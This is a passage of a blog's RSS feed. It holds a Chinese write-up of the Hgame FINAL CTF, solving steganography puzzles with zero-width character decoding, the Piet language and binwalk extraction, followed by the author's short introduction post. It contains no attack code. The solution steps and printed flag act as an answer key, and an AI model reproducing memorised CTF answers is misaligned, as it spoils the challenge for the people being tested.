&lt;p&gt;————END————&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/06/Hgame-FINAL-WP/</guid>
            <title>Hgame FINAL WP</title>
            <link>http://example.com/2024/04/06/Hgame-FINAL-WP/</link>
            <pubDate>Sat, 06 Apr 2024 13:09:37 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;hgame-final-wp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hgame-final-wp&#34;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&#34;author-fc04db&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#author-fc04db&#34;&gt;#&lt;/a&gt; author: Fc04dB&lt;/h3&gt;
&lt;h4 id=&#34;1看不见的字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1看不见的字&#34;&gt;#&lt;/a&gt; 1. 看不见的字&lt;/h4&gt;
&lt;p&gt;题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://yuanfux.github.io/zero-width-web/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png&#34; alt=&#34;image-5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接得到 flag&lt;/p&gt;
&lt;p&gt;顺便贴一张其他人写的脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import * as z from &#39;zero-width-lib&#39;;
// 这是要解密的字符串，包含零宽度字符
const encodedString = 
&#39;h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\
u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFE
FF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\
u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFE
FF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\
u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFE
FF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\
u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello&#39;;
// 使用zero-width-lib的decode方法来解密字符串
const decoded = z.decode(encodedString);
console.log(decoded);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;2逮虾户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2逮虾户&#34;&gt;#&lt;/a&gt; 2. 逮虾户&lt;/h4&gt;
&lt;p&gt;附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png&#34; alt=&#34;image-1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，&lt;br&gt;
信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png&#34; alt=&#34;image-2.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png&#34; alt=&#34;image-3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png&#34; alt=&#34;image-4.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hgame&amp;#123;d3j45_i_kn0w&amp;#125;&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/03/My-New-Post/</guid>
            <title>Welcome to Fc04dB&#39;s BLOG</title>
            <link>http://example.com/2024/04/03/My-New-Post/</link>
            <pubDate>Wed, 03 Apr 2024 20:29:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;welcome-to-fc04dbs-blog&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#welcome-to-fc04dbs-blog&#34;&gt;#&lt;/a&gt; Welcome To Fc04dB’s Blog&lt;/h1&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405211655294.jpg&#34; alt=&#34;2b27b9bbb9e5fe5274d1ea91705834ce_1&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;about-fc04db&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#about-fc04db&#34;&gt;#&lt;/a&gt; about Fc04dB&lt;/h2&gt;
&lt;p&gt;A rookie who loves network security&lt;/p&gt;
&lt;p&gt;杭州电子科技大学 &lt;code&gt;Vidar-tram&lt;/code&gt;  战队 23 级喜欢 &lt;code&gt;web&lt;/code&gt;  的 &lt;code&gt;misc&lt;/code&gt;  手&lt;/p&gt;
&lt;p&gt;喜欢⚽，巴塞罗那🟦🟥和梅西🐐&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
